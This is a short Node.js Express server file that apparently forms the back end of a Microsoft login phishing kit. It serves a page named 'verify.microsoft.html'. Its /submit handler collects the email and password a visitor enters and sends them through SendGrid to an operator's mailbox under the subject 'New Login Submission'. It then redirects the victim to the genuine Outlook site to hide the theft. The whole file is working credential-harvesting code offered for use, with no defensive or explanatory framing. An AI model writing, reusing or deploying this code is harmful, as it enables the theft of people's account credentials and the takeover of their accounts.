const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const path = require('path');

const app = express();
const port = 3000;

// Debug: check environment variables
console.log('SENDGRID_API_KEY:', process.env.SENDGRID_API_KEY?.substring(0,4));
console.log('RECEIVER_EMAIL:', process.env.RECEIVER_EMAIL);

// Validate environment variables
if (!process.env.SENDGRID_API_KEY || !process.env.RECEIVER_EMAIL) {
  console.error('❌ Missing SENDGRID_API_KEY or RECEIVER_EMAIL. Check Railway variables.');
  process.exit(1);
}

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
});

app.post('/submit', async (req, res) => {
  const { email, password } = req.body;

  const msg = {
    to: process.env.RECEIVER_EMAIL,
    from: process.env.RECEIVER_EMAIL,
    subject: 'New Login Submission',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    await sgMail.send(msg);
    res.redirect('https://outlook.office365.com');
  } catch (error) {
    console.error('SendGrid error:', error);
    res.status(500).send('Error sending email.');
  }
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
